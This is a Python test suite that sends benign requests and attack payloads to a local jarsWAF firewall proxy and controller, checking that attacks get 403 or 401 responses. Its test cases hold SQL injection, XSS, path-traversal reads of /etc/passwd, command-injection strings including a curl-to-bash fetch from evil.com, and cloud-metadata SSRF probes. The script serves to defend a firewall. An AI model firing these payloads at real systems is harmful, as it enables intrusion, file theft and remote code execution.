#!/usr/bin/env python3
"""
jarsWAF Comprehensive Live Penetration & Regression Testing Suite
Tests live traffic against jarsWAF Proxy (port 8000) and Controller (port 8088/9443).
"""

import sys
import time
import json
import urllib.request
import urllib.error
import urllib.parse
from dataclasses import dataclass
from typing import Optional, Dict, Any, List

# Colors for terminal output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

@dataclass
class TestCase:
    category: str
    name: str
    target_url: str
    method: str = "GET"
    headers: Optional[Dict[str, str]] = None
    body: Optional[str] = None
    expected_status: int = 403  # 403 Forbidden for blocked attacks
    allowed_statuses: Optional[List[int]] = None  # e.g., [200, 404] for benign pass-through
    description: str = ""

def make_request(test: TestCase, timeout: float = 5.0) -> tuple[int, str, Dict[str, str]]:
    req_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
    }
    if test.headers:
        req_headers.update(test.headers)

    data_bytes = test.body.encode("utf-8") if test.body else None

    req = urllib.request.Request(
        test.target_url,
        data=data_bytes,
        headers=req_headers,
        method=test.method
    )

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            resp_body = resp.read().decode("utf-8", errors="replace")
            resp_headers = dict(resp.headers)
            return resp.status, resp_body, resp_headers
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode("utf-8", errors="replace")
        resp_headers = dict(e.headers)
        return e.code, resp_body, resp_headers
    except Exception as e:
        return 0, str(e), {}

def run_suite(proxy_base: str, controller_base: str, host_header: str = "jarswaf.local"):
    print(f"\n{CYAN}{BOLD}{'='*70}{RESET}")
    print(f"{CYAN}{BOLD}🛡️  jarsWAF LIVE PENETRATION & HARDENING TEST SUITE{RESET}")
    print(f"{CYAN}{BOLD}{'='*70}{RESET}")
    print(f"  {BOLD}WAF Proxy Target:{RESET}      {proxy_base} (Host: {host_header})")
    print(f"  {BOLD}Controller Target:{RESET}     {controller_base}")
    print(f"{CYAN}{BOLD}{'='*70}{RESET}\n")

    default_headers = {"Host": host_header}

    test_cases: List[TestCase] = [
        # --- BENIGN / LEGITIMATE TRAFFIC ---
        TestCase(
            category="BENIGN",
            name="Legitimate Health Check",
            target_url=f"{proxy_base}/health",
            headers=default_headers,
            expected_status=200,
            description="Normal health check request should pass WAF and reach backend (200 OK)"
        ),
        TestCase(
            category="BENIGN",
            name="Normal Clean Search Query",
            target_url=f"{proxy_base}/search?q=laptop+gaming+rtx+4090",
            headers=default_headers,
            expected_status=404,
            allowed_statuses=[200, 404],
            description="Clean query parameters should pass WAF without being blocked (HTTP 403)"
        ),
        TestCase(
            category="BENIGN",
            name="Legitimate JSON API POST",
            target_url=f"{proxy_base}/api/v1/contact",
            method="POST",
            headers={**default_headers, "Content-Type": "application/json"},
            body=json.dumps({"name": "Budi Santoso", "message": "Halo, saya tertarik dengan layanan jarsWAF"}),
            expected_status=404,
            allowed_statuses=[200, 404, 405],
            description="Normal benign JSON payload should pass WAF cleanly (non-403 from backend)"
        ),

        # --- SQL INJECTION (SQLi) ---
        TestCase(
            category="SQLI",
            name="Classic Tautology SQLi",
            target_url=f"{proxy_base}/products?id=1'+OR+'1'='1",
            headers=default_headers,
            expected_status=403,
            description="Tautology ' OR '1'='1 in query string"
        ),
        TestCase(
            category="SQLI",
            name="Union Select SQLi",
            target_url=f"{proxy_base}/users?user=1+UNION+SELECT+1,username,password+FROM+admin_users",
            headers=default_headers,
            expected_status=403,
            description="UNION SELECT attack pattern"
        ),
        TestCase(
            category="SQLI",
            name="Double URL Encoded SQLi",
            target_url=f"{proxy_base}/items?id=1%2527%2520OR%25201%253D1--",
            headers=default_headers,
            expected_status=403,
            description="Double URL encoded single quote and comment evasion"
        ),
        TestCase(
            category="SQLI",
            name="Inline Comment Evasion SQLi",
            target_url=f"{proxy_base}/api/v1/user?id=1'/**/OR/**/1=1#",
            headers=default_headers,
            expected_status=403,
            description="Inline comment /**/ SQLi obfuscation"
        ),
        TestCase(
            category="SQLI",
            name="POST Body SQLi Tautology",
            target_url=f"{proxy_base}/api/login",
            method="POST",
            headers={**default_headers, "Content-Type": "application/x-www-form-urlencoded"},
            body="username=admin' OR 1=1--&password=foo",
            expected_status=403,
            description="SQL injection in POST body"
        ),
        TestCase(
            category="SQLI",
            name="Time-Based Blind SQLi (SLEEP / BENCHMARK)",
            target_url=f"{proxy_base}/items?category=1;WAITFOR+DELAY+'0:0:5'--",
            headers=default_headers,
            expected_status=403,
            description="Time-based blind SQL injection payload"
        ),

        # --- CROSS-SITE SCRIPTING (XSS) ---
        TestCase(
            category="XSS",
            name="URL-Encoded <script> Tag XSS",
            target_url=f"{proxy_base}/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E",
            headers=default_headers,
            expected_status=403,
            description="Standard script tag injection in URL encoded query"
        ),
        TestCase(
            category="XSS",
            name="URL-Encoded SVG Event Handler XSS",
            target_url=f"{proxy_base}/profile?name=%3Csvg%2Fonload%3Dalert(1)%3E",
            headers=default_headers,
            expected_status=403,
            description="SVG inline event handler vector"
        ),
        TestCase(
            category="XSS",
            name="URL-Encoded IMG onerror XSS",
            target_url=f"{proxy_base}/avatar?url=%3Cimg%20src%3Dx%20onerror%3Dalert('xss')%3E",
            headers=default_headers,
            expected_status=403,
            description="Image onerror DOM event handler"
        ),
        TestCase(
            category="XSS",
            name="HTML Entity Encoded XSS",
            target_url=f"{proxy_base}/comment?text=&lt;script&gt;alert(1)&lt;/script&gt;",
            headers=default_headers,
            expected_status=403,
            description="HTML entity encoded script payload"
        ),
        TestCase(
            category="XSS",
            name="JavaScript Protocol URI in Href",
            target_url=f"{proxy_base}/redirect?to=javascript%3Aalert(1)",
            headers=default_headers,
            expected_status=403,
            description="javascript: pseudo-protocol XSS vector"
        ),

        # --- LOCAL FILE INCLUSION / PATH TRAVERSAL (LFI) ---
        TestCase(
            category="LFI",
            name="Path Traversal to /etc/passwd",
            target_url=f"{proxy_base}/view?file=../../../../etc/passwd",
            headers=default_headers,
            expected_status=403,
            description="Dot-dot-slash directory traversal"
        ),
        TestCase(
            category="LFI",
            name="IIS Unicode %u Encoded Traversal",
            target_url=f"{proxy_base}/download?path=%u002e%u002e%u002f%u002e%u002e%u002fetc/passwd",
            headers=default_headers,
            expected_status=403,
            description="IIS Unicode escape directory traversal"
        ),
        TestCase(
            category="LFI",
            name="PHP Filter Stream Wrapper",
            target_url=f"{proxy_base}/index.php?page=php://filter/convert.base64-encode/resource=index.php",
            headers=default_headers,
            expected_status=403,
            description="PHP stream wrapper arbitrary file read"
        ),
        TestCase(
            category="LFI",
            name="Windows System Path Traversal",
            target_url=f"{proxy_base}/load?file=..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
            headers=default_headers,
            expected_status=403,
            description="Backslash encoded Windows directory traversal"
        ),

        # --- COMMAND INJECTION (CMDI / RCE) ---
        TestCase(
            category="CMDI",
            name="Piped Command Injection",
            target_url=f"{proxy_base}/ping?host=127.0.0.1|cat+/etc/passwd",
            headers=default_headers,
            expected_status=403,
            description="Pipe character command chaining"
        ),
        TestCase(
            category="CMDI",
            name="Subshell Command Injection",
            target_url=f"{proxy_base}/status?ip=$(whoami)",
            headers=default_headers,
            expected_status=403,
            description="Subshell syntax command execution"
        ),
        TestCase(
            category="CMDI",
            name="Backtick Command Injection",
            target_url=f"{proxy_base}/status?ip=`id`",
            headers=default_headers,
            expected_status=403,
            description="Backtick evaluation command execution"
        ),
        TestCase(
            category="CMDI",
            name="Semicolon Chained Shell Command",
            target_url=f"{proxy_base}/run?arg=test;curl+http://evil.com/shell.sh|bash",
            headers=default_headers,
            expected_status=403,
            description="Semicolon chained curl-to-bash execution"
        ),

        # --- SERVER-SIDE REQUEST FORGERY (SSRF) ---
        TestCase(
            category="SSRF",
            name="AWS/GCP Cloud Metadata SSRF",
            target_url=f"{proxy_base}/fetch?url=http://169.254.169.254/latest/meta-data/",
            headers=default_headers,
            expected_status=403,
            description="Cloud instance metadata endpoint probing"
        ),
        TestCase(
            category="SSRF",
            name="OOB Callback Server SSRF",
            target_url=f"{proxy_base}/fetch?url=http://test.burpcollaborator.net/ping",
            headers=default_headers,
            expected_status=403,
            description="Burp Collaborator out-of-band interaction detection"
        ),

        # --- CONTROLLER AUTHENTICATION HARDENING ---
        TestCase(
            category="AUTH",
            name="Missing / Empty Bearer Token on Protected API",
            target_url=f"{controller_base}/api/v1/vhosts",
            headers={"Authorization": "Bearer "},
            expected_status=401,
            description="Protected controller API should reject empty Bearer token"
        ),
        TestCase(
            category="AUTH",
            name="Unauthenticated Access to System Config API",
            target_url=f"{controller_base}/api/v1/config",
            expected_status=401,
            description="Controller config API should reject unauthenticated request"
        ),
        TestCase(
            category="AUTH",
            name="Forged Random Session Token",
            target_url=f"{controller_base}/api/v1/vhosts",
            headers={"Authorization": "Bearer forged-invalid-token-12345"},
            expected_status=401,
            description="Controller API should reject forged invalid Bearer session"
        ),
        TestCase(
            category="AUTH",
            name="Forged Metrics Header Token",
            target_url=f"{controller_base}/api/v1/vhosts",
            headers={"x-metrics-token": "forged-token-abc"},
            expected_status=401,
            description="Controller API should reject unverified x-metrics-token"
        ),
    ]

    passed_count = 0
    failed_count = 0

    current_cat = ""
    for idx, test in enumerate(test_cases, 1):
        if test.category != current_cat:
            current_cat = test.category
            print(f"\n{BOLD}{'[' + current_cat + '] ' + '='*50}{RESET}")

        status, body, resp_headers = make_request(test)

        if test.allowed_statuses:
            is_passed = status in test.allowed_statuses
        else:
            is_passed = (status == test.expected_status)

        if is_passed:
            passed_count += 1
            result_tag = f"{GREEN}{BOLD}[PASS]{RESET}"
            status_tag = f"{GREEN}HTTP {status}{RESET}"
        else:
            failed_count += 1
            result_tag = f"{RED}{BOLD}[FAIL]{RESET}"
            expected_str = f"{test.allowed_statuses}" if test.allowed_statuses else f"{test.expected_status}"
            status_tag = f"{RED}HTTP {status} (Expected {expected_str}){RESET}"

        print(f"  {result_tag} #{idx:02d} {test.name}")
        print(f"         {DIM}Target:{RESET} {test.target_url}")
        print(f"         {DIM}Result:{RESET} {status_tag} - {test.description}")

        # Check if WAF block page / response was returned for blocked requests
        if status == 403:
            if "jarsWAF" in body or "WAF" in body or "blocked" in body.lower() or "forbidden" in body.lower():
                print(f"         {GREEN}↳ Block page verified: jarsWAF signature confirmed{RESET}")

    # Summary
    total = len(test_cases)
    print(f"\n{CYAN}{BOLD}{'='*70}{RESET}")
    print(f"{BOLD}📊 TEST EXECUTION SUMMARY{RESET}")
    print(f"{CYAN}{BOLD}{'='*70}{RESET}")
    print(f"  Total Tests Executed: {BOLD}{total}{RESET}")
    print(f"  Passed:               {GREEN}{BOLD}{passed_count}{RESET} / {total} ({(passed_count/total)*100:.1f}%)")
    print(f"  Failed:               {RED}{BOLD}{failed_count}{RESET} / {total}")
    print(f"{CYAN}{BOLD}{'='*70}{RESET}\n")

    if failed_count == 0:
        print(f"{GREEN}{BOLD}🎉 ALL LIVE PENETRATION & HARDENING TESTS PASSED 100% SUCCESSFULLY!{RESET}\n")
        return 0
    else:
        print(f"{RED}{BOLD}⚠️ SOME TESTS FAILED. PLEASE REVIEW THE OUTPUT ABOVE.{RESET}\n")
        return 1

if __name__ == "__main__":
    proxy_url = "http://127.0.0.1:8000"
    controller_url = "http://127.0.0.1:8088"
    host_hdr = "jarswaf.local"

    if len(sys.argv) > 1:
        proxy_url = sys.argv[1]
    if len(sys.argv) > 2:
        controller_url = sys.argv[2]
    if len(sys.argv) > 3:
        host_hdr = sys.argv[3]

    exit_code = run_suite(proxy_url, controller_url, host_hdr)
    sys.exit(exit_code)
